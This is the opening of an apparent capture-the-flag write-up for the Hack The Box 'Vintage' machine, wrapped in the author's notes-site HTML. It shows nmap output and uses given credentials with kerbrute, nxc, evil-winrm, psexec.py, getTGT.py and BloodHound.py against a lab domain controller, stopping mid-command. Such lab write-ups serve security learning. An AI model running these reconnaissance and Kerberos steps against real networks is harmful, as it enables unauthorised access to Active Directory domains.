@@ -1,0 +1,926 @@
+<!doctype html>
+<html class="no-js" lang="en" data-content_root="">
+  <head><meta charset="utf-8"/>
+    <meta name="viewport" content="width=device-width,initial-scale=1"/>
+    <meta name="color-scheme" content="light dark"><meta name="viewport" content="width=device-width, initial-scale=1" />
+
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-2TCTE0JE23"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'G-2TCTE0JE23');
+    </script>
+        <link href="../../../../_static/lazer_fox.png" sizes="300x300" rel="icon" type="image/png"><link rel="index" title="Index" href="../../../../genindex.html" /><link rel="search" title="Search" href="../../../../search.html" /><link rel="next" title="Medium" href="../../medium/medium.html" /><link rel="prev" title="Snoopy" href="../snoopy/snoopy.html" />
+
+    <!-- Generated with Sphinx 7.1.2 and Furo 2023.08.19 -->
+        <title>Vintage - blnkn&#39;s notes</title>
+      <link rel="stylesheet" type="text/css" href="../../../../_static/pygments.css?v=8f2a1f02" />
+    <link rel="stylesheet" type="text/css" href="../../../../_static/styles/furo.css?v=135e06be" />
+    <link rel="stylesheet" type="text/css" href="../../../../_static/styles/furo-extensions.css?v=36a5483c" />
+    
+    
+
+
+<style>
+  body {
+    --color-code-background: #f8f8f8;
+  --color-code-foreground: black;
+  
+  }
+  @media not print {
+    body[data-theme="dark"] {
+      --color-code-background: #202020;
+  --color-code-foreground: #d0d0d0;
+  
+    }
+    @media (prefers-color-scheme: dark) {
+      body:not([data-theme="light"]) {
+        --color-code-background: #202020;
+  --color-code-foreground: #d0d0d0;
+  
+      }
+    }
+  }
+</style></head>
+  <body>
+    
+    <script>
+      document.body.dataset.theme = localStorage.getItem("theme") || "auto";
+    </script>
+    
+
+<svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
+  <symbol id="svg-toc" viewBox="0 0 24 24">
+    <title>Contents</title>
+    <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024">
+      <path d="M408 442h480c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8H408c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8zm-8 204c0 4.4 3.6 8 8 8h480c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8H408c-4.4 0-8 3.6-8 8v56zm504-486H120c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zm0 632H120c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zM115.4 518.9L271.7 642c5.8 4.6 14.4.5 14.4-6.9V388.9c0-7.4-8.5-11.5-14.4-6.9L115.4 505.1a8.74 8.74 0 0 0 0 13.8z"/>
+    </svg>
+  </symbol>
+  <symbol id="svg-menu" viewBox="0 0 24 24">
+    <title>Menu</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather-menu">
+      <line x1="3" y1="12" x2="21" y2="12"></line>
+      <line x1="3" y1="6" x2="21" y2="6"></line>
+      <line x1="3" y1="18" x2="21" y2="18"></line>
+    </svg>
+  </symbol>
+  <symbol id="svg-arrow-right" viewBox="0 0 24 24">
+    <title>Expand</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather-chevron-right">
+      <polyline points="9 18 15 12 9 6"></polyline>
+    </svg>
+  </symbol>
+  <symbol id="svg-sun" viewBox="0 0 24 24">
+    <title>Light mode</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="feather-sun">
+      <circle cx="12" cy="12" r="5"></circle>
+      <line x1="12" y1="1" x2="12" y2="3"></line>
+      <line x1="12" y1="21" x2="12" y2="23"></line>
+      <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+      <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+      <line x1="1" y1="12" x2="3" y2="12"></line>
+      <line x1="21" y1="12" x2="23" y2="12"></line>
+      <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+      <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+    </svg>
+  </symbol>
+  <symbol id="svg-moon" viewBox="0 0 24 24">
+    <title>Dark mode</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="icon-tabler-moon">
+      <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+      <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z" />
+    </svg>
+  </symbol>
+  <symbol id="svg-sun-half" viewBox="0 0 24 24">
+    <title>Auto light/dark mode</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="icon-tabler-shadow">
+      <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+      <circle cx="12" cy="12" r="9" />
+      <path d="M13 12h5" />
+      <path d="M13 15h4" />
+      <path d="M13 18h1" />
+      <path d="M13 9h4" />
+      <path d="M13 6h1" />
+    </svg>
+  </symbol>
+</svg>
+
+<input type="checkbox" class="sidebar-toggle" name="__navigation" id="__navigation">
+<input type="checkbox" class="sidebar-toggle" name="__toc" id="__toc">
+<label class="overlay sidebar-overlay" for="__navigation">
+  <div class="visually-hidden">Hide navigation sidebar</div>
+</label>
+<label class="overlay toc-overlay" for="__toc">
+  <div class="visually-hidden">Hide table of contents sidebar</div>
+</label>
+
+
+
+<div class="page">
+  <header class="mobile-header">
+    <div class="header-left">
+      <label class="nav-overlay-icon" for="__navigation">
+        <div class="visually-hidden">Toggle site navigation sidebar</div>
+        <i class="icon"><svg><use href="#svg-menu"></use></svg></i>
+      </label>
+    </div>
+    <div class="header-center">
+      <a href="../../../../index.html"><div class="brand">blnkn's notes</div></a>
+    </div>
+    <div class="header-right">
+      <div class="theme-toggle-container theme-toggle-header">
+        <button class="theme-toggle">
+          <div class="visually-hidden">Toggle Light / Dark / Auto color theme</div>
+          <svg class="theme-icon-when-auto"><use href="#svg-sun-half"></use></svg>
+          <svg class="theme-icon-when-dark"><use href="#svg-moon"></use></svg>
+          <svg class="theme-icon-when-light"><use href="#svg-sun"></use></svg>
+        </button>
+      </div>
+      <label class="toc-overlay-icon toc-header-icon" for="__toc">
+        <div class="visually-hidden">Toggle table of contents sidebar</div>
+        <i class="icon"><svg><use href="#svg-toc"></use></svg></i>
+      </label>
+    </div>
+  </header>
+  <aside class="sidebar-drawer">
+    <div class="sidebar-container">
+      
+      <div class="sidebar-sticky"><a class="sidebar-brand" href="../../../../index.html">
+  
+  <div class="sidebar-logo-container">
+    <img class="sidebar-logo" src="../../../../_static/lazer_fox.png" alt="Logo"/>
+  </div>
+  
+  <span class="sidebar-brand-text">blnkn's notes</span>
+  
+</a><form class="sidebar-search-container" method="get" action="../../../../search.html" role="search">
+  <input class="sidebar-search" placeholder="Search" name="q" aria-label="Search">
+  <input type="hidden" name="check_keywords" value="yes">
+  <input type="hidden" name="area" value="default">
+</form>
+<div id="searchbox"></div><div class="sidebar-scroll"><div class="sidebar-tree">
+  <p class="caption" role="heading"><span class="caption-text">Contents:</span></p>
+<ul class="current">
+<li class="toctree-l1 current has-children"><a class="reference internal" href="../../../htb.html">Hack The Box</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-1" name="toctree-checkbox-1" role="switch" type="checkbox"/><label for="toctree-checkbox-1"><div class="visually-hidden">Toggle navigation of Hack The Box</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
+<li class="toctree-l2 has-children"><a class="reference internal" href="../../../academy/academy.html">Academy</a><input class="toctree-checkbox" id="toctree-checkbox-2" name="toctree-checkbox-2" role="switch" type="checkbox"/><label for="toctree-checkbox-2"><div class="visually-hidden">Toggle navigation of Academy</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../../academy/active-directory/active-directory.html">Active Directory</a><input class="toctree-checkbox" id="toctree-checkbox-3" name="toctree-checkbox-3" role="switch" type="checkbox"/><label for="toctree-checkbox-3"><div class="visually-hidden">Toggle navigation of Active Directory</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/active-directory-enum-and-attacks/active-directory-enum-and-attacks.html">Active Directory Enum and Attacks</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/ad/ad.html">Active Directory</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/ad/ad.html#user-account-control-values">User Account Control Values</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/kerberos/kerberos.html">Kerberos</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/windows-auth/windows-auth.html">Windows Authentication</a></li>
+</ul>
+</li>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../../academy/buffer-overflows/buffer-overflows.html">Buffer Overflows</a><input class="toctree-checkbox" id="toctree-checkbox-4" name="toctree-checkbox-4" role="switch" type="checkbox"/><label for="toctree-checkbox-4"><div class="visually-hidden">Toggle navigation of Buffer Overflows</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/buffer-overflows/linux-buffer-overflows/linux-buffer-overflows.html">Linux Buffer Overflows</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="../../../academy/hashcat/hashcat.html">Hashcat</a></li>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../../academy/os-fundamentals/os-fundamentals.html">OS Fundamentals</a><input class="toctree-checkbox" id="toctree-checkbox-5" name="toctree-checkbox-5" role="switch" type="checkbox"/><label for="toctree-checkbox-5"><div class="visually-hidden">Toggle navigation of OS Fundamentals</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/os-fundamentals/windows-fundamentals/windows-fundamentals.html">Windows OS Fundamentals</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="../../../academy/sqli/sqli.html">SQLi</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../../academy/webapp/webapp.html">Web Apps</a></li>
+</ul>
+</li>
+<li class="toctree-l2 current has-children"><a class="reference internal" href="../../machines.html">Lab Machines</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-6" name="toctree-checkbox-6" role="switch" type="checkbox"/><label for="toctree-checkbox-6"><div class="visually-hidden">Toggle navigation of Lab Machines</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
+<li class="toctree-l3 current has-children"><a class="reference internal" href="../hard.html">Hard</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-7" name="toctree-checkbox-7" role="switch" type="checkbox"/><label for="toctree-checkbox-7"><div class="visually-hidden">Toggle navigation of Hard</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
+<li class="toctree-l4"><a class="reference internal" href="../snoopy/snoopy.html">Snoopy</a></li>
+<li class="toctree-l4 current current-page"><a class="current reference internal" href="#">Vintage</a></li>
+</ul>
+</li>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../medium/medium.html">Medium</a><input class="toctree-checkbox" id="toctree-checkbox-8" name="toctree-checkbox-8" role="switch" type="checkbox"/><label for="toctree-checkbox-8"><div class="visually-hidden">Toggle navigation of Medium</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../medium/administrator/administrator.html">Administrator</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../medium/ambassador/ambassador.html">Ambassador</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../medium/authority/authority.html">Authority</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../medium/awkward/awkward.html">Awkward</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../medium/faculty/faculty.html">Faculty</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../medium/forgot/forgot.html">Forgot</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../medium/format/format.html">Format</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../medium/health/health.html">Health</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../medium/jupiter/jupiter.html">Jupiter</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../medium/manager/manager.html">Manager</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../medium/mentor/mentor.html">Mentor</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../medium/only4you/only4you.html">Only4you</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../medium/outdated/outdated.html">Outdated</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../medium/sandworm/sandworm.html">Sandworm</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../medium/scrambled/scrambled.html">Scrambled</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../medium/shared/shared.html">Shared</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../medium/thefrizz/thefrizz.html">The Frizz</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../medium/updown/updown.html">Updown</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../medium/zipping/zipping.html">Zipping</a></li>
+</ul>
+</li>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../easy/easy.html">Easy</a><input class="toctree-checkbox" id="toctree-checkbox-9" name="toctree-checkbox-9" role="switch" type="checkbox"/><label for="toctree-checkbox-9"><div class="visually-hidden">Toggle navigation of Easy</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/analytics/analytics.html">Analytics</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/busqueda/busqueda.html">Busqueda</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/code/code.html">Code</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/codify/codify.html">Codify</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/dog/dog.html">Dog</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/escapetwo/escapetwo.html">Escape Two</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/inject/inject.html">Inject</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/keeper/keeper.html">Keeper</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/metatwo/metatwo.html">Meta two</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/monitorstwo/monitorstwo.html">Monitors two</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/pc/pc.html">Pc</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/photobomb/photobomb.html">Photobomb</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/pilgrimage/pilgrimage.html">Pilgrimage</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/precious/precious.html">Precious</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/red_panda/red_panda.html">Red panda</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/sau/sau.html">Sau</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/shoppy/shoppy.html">Shoppy</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/soccer/soccer.html">Soccer</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/stocker/stocker.html">Stocker</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/support/support.html">Support</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/topology/topology.html">Topology</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/trick/trick.html">Trick</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../pg/pg.html">Proving Grounds</a><input class="toctree-checkbox" id="toctree-checkbox-10" name="toctree-checkbox-10" role="switch" type="checkbox"/><label for="toctree-checkbox-10"><div class="visually-hidden">Toggle navigation of Proving Grounds</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l2"><a class="reference internal" href="../../../../pg/ha_natraj/ha_natraj.html">Ha Natraj</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../pg/sunset_decoy/sunset_decoy.html">Sunset Decoy</a></li>
+</ul>
+</li>
+<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../dvwa/dvwa.html">DVWA</a><input class="toctree-checkbox" id="toctree-checkbox-11" name="toctree-checkbox-11" role="switch" type="checkbox"/><label for="toctree-checkbox-11"><div class="visually-hidden">Toggle navigation of DVWA</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l2"><a class="reference internal" href="../../../../dvwa/sqli_blind/sqli_blind.html">Blind SQLi</a></li>
+</ul>
+</li>
+<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../other/other.html">Other</a><input class="toctree-checkbox" id="toctree-checkbox-12" name="toctree-checkbox-12" role="switch" type="checkbox"/><label for="toctree-checkbox-12"><div class="visually-hidden">Toggle navigation of Other</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/assembly/assembly.html">Assembly</a></li>
+<li class="toctree-l2 has-children"><a class="reference internal" href="../../../../other/aws-ccp/aws-ccp.html">AWS-CCP</a><input class="toctree-checkbox" id="toctree-checkbox-13" name="toctree-checkbox-13" role="switch" type="checkbox"/><label for="toctree-checkbox-13"><div class="visually-hidden">Toggle navigation of AWS-CCP</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/1-foundations-of-cloud-computing.html">Foundations of Cloud Computing</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/2-technology.html">Technologies</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/3-security-and-compliance.html">Security and Compliance</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/4-pricing-billing-and-governance.html">Pricing Billing and Governance</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/codebashing/codebashing.html">Codebashing</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/dba/dba.html">Database Administration</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/dorking/dorking.html">Google dork cheatsheet</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/empire/empire.html">Empire</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/hashes/hashes.html">Hashes</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/irssi/irssi.html">Irssi</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/metasploit/metasploit.html">Metasploit framework</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/nmap/nmap.html">Nmap</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/reconstructing-private-key/reconstructing-private-key.html">Reconstructing a Private Key</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/rfid/rfid.html">RFID</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/server-hardening/server-hardening.html">Server Hardening</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/shells/shells.html">Reverse Shells</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/stego/stego.html">Steganography</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/tcpdump-vuln/tcpdump-vuln.html">TCPdump</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/wordlists/wordlists.html">Making Custom Wordlists</a></li>
+<li class="toctree-l2 has-children"><a class="reference internal" href="../../../../other/c/c.html">C</a><input class="toctree-checkbox" id="toctree-checkbox-14" name="toctree-checkbox-14" role="switch" type="checkbox"/><label for="toctree-checkbox-14"><div class="visually-hidden">Toggle navigation of C</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/c/execution-methods.html">C Execution methods</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/air-ungap/air-ungap.html">Air-Ungap</a></li>
+</ul>
+</li>
+</ul>
+
+</div>
+</div>
+
+      </div>
+      
+    </div>
+  </aside>
+  <div class="main">
+    <div class="content">
+      <div class="article-container">
+        <a href="#" class="back-to-top muted-link">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12z"></path>
+          </svg>
+          <span>Back to top</span>
+        </a>
+        <div class="content-icon-container">
+          
+<div class="theme-toggle-container theme-toggle-content">
+            <button class="theme-toggle">
+              <div class="visually-hidden">Toggle Light / Dark / Auto color theme</div>
+              <svg class="theme-icon-when-auto"><use href="#svg-sun-half"></use></svg>
+              <svg class="theme-icon-when-dark"><use href="#svg-moon"></use></svg>
+              <svg class="theme-icon-when-light"><use href="#svg-sun"></use></svg>
+            </button>
+          </div>
+          <label class="toc-overlay-icon toc-content-icon" for="__toc">
+            <div class="visually-hidden">Toggle table of contents sidebar</div>
+            <i class="icon"><svg><use href="#svg-toc"></use></svg></i>
+          </label>
+        </div>
+        <article role="main">
+          <section id="vintage">
+<h1>Vintage<a class="headerlink" href="#vintage" title="Permalink to this heading">#</a></h1>
+<p><img alt="vintage.png" src="../../../../_images/vintage.png" /></p>
+<section id="initial-enumeration">
+<h2>Initial Enumeration<a class="headerlink" href="#initial-enumeration" title="Permalink to this heading">#</a></h2>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>-Pn<span class="w"> </span><span class="m">10</span>.10.11.45<span class="w"> </span>-oN<span class="w"> </span>scans/nmap.initial
+</pre></div>
+</div>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-23 21:34 GMT
+Stats: 0:02:17 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
+Connect Scan Timing: About 36.68% done; ETC: 21:41 (0:03:57 remaining)
+Stats: 0:06:18 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 91.67% done; ETC: 21:41 (0:00:05 remaining)
+Stats: 0:07:29 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 98.96% done; ETC: 21:42 (0:00:00 remaining)
+Nmap scan report for 10.10.11.45
+Host is up (1.1s latency).
+Not shown: 988 filtered tcp ports (no-response)
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-03-23 14:40:29Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode:
+|   3:1:1:
+|_    Message signing enabled and required
+| smb2-time:
+|   date: 2025-03-23T14:41:23
+|_  start_date: N/A
+|_clock-skew: -6h59m57s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 452.07 seconds
+</pre></div>
+</div>
+<p>Windows auth is apparently disabled</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>nxc<span class="w"> </span>ldap<span class="w"> </span><span class="m">10</span>.10.11.45<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;p.rosa&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Rosaisbest123&#39;</span>
+</pre></div>
+</div>
+<p>Trying to see if I can find some users, not really</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>kerbrute<span class="w"> </span>userenum<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-d<span class="w"> </span>vintage.htb<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--dc<span class="w"> </span><span class="m">10</span>.10.11.45<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-o<span class="w"> </span>loot/valid_ad_users<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>/usr/share/seclists-git/Usernames/xato-net-10-million-usernames-dup.txt
+</pre></div>
+</div>
+<p>Fails</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>smbclient<span class="w"> </span>-U<span class="w"> </span><span class="s1">&#39;p.rosa&#39;</span><span class="w"> </span>--password<span class="w"> </span><span class="s1">&#39;Rosaisbest123&#39;</span><span class="w"> </span>-L<span class="w"> </span>//10.10.11.45/
+</pre></div>
+</div>
+<p>Fails</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>evil-winrm<span class="w"> </span>-i<span class="w"> </span>vintage.htb<span class="w"> </span>-u<span class="w"> </span>p.rosa<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Rosaisbest123&#39;</span>
+</pre></div>
+</div>
+<p>We just get the domain out of that nothing more</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>python3<span class="w"> </span>enum4linux-ng.py<span class="w"> </span>-As<span class="w"> </span><span class="m">10</span>.10.11.45
+</pre></div>
+</div>
+<p>Further dns enumeration</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>dig<span class="w"> </span>+short<span class="w"> </span>ANY<span class="w"> </span>@10.10.11.45<span class="w"> </span>vintage.htb
+<span class="m">10</span>.10.11.45
+dc01.vintage.htb.
+dc01.vintage.htb.<span class="w"> </span>hostmaster.vintage.htb.<span class="w"> </span><span class="m">226</span><span class="w"> </span><span class="m">900</span><span class="w"> </span><span class="m">600</span><span class="w"> </span><span class="m">86400</span><span class="w"> </span><span class="m">3600</span>
+</pre></div>
+</div>
+<p>Sincing NTP with the controller</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>sudo<span class="w"> </span>ntpdate<span class="w"> </span>vintage.htb
+</pre></div>
+</div>
+<p>We can get a TGT with rosa’s creds</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>getTGT.py<span class="w"> </span>vintage.htb/p.rosa:<span class="s1">&#39;Rosaisbest123&#39;</span>
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>p.rosa.ccache
+</pre></div>
+</div>
+<p>Fails</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>evil-winrm<span class="w"> </span>-i<span class="w"> </span>dc01.vintage.htb<span class="w"> </span>-r<span class="w"> </span>vintage.htb
+</pre></div>
+</div>
+<p>Fails</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>psexec.py<span class="w"> </span>vintage.htb/p.rosa@vintage.htb<span class="w"> </span>-k<span class="w"> </span>-no-pass
+</pre></div>
+</div>
+<p>But we can authenticate to ldap apparently</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>nxc<span class="w"> </span>ldap<span class="w"> </span><span class="m">10</span>.10.11.45<span class="w"> </span>-k<span class="w"> </span>--use-kcache
+</pre></div>
+</div>
+</section>
+<section id="enumeration-ad-ldap">
+<h2>Enumeration AD/LDAP<a class="headerlink" href="#enumeration-ad-ldap" title="Permalink to this heading">#</a></h2>
+<p>Using bloodhound.py to dump some ldap data for bloodhound</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>python3<span class="w"> </span>/opt/BloodHound.py/bloodhound.py<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-u<span class="w"> </span><span class="s1">&#39;p.rosa&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-p<span class="w"> </span><span class="s1">&#39;Rosaisbest123&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-d<span class="w"> </span>vintage.htb<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-ns<span class="w"> </span><span class="m">10</span>.10.11.45<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-c<span class="w"> </span>All<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-k
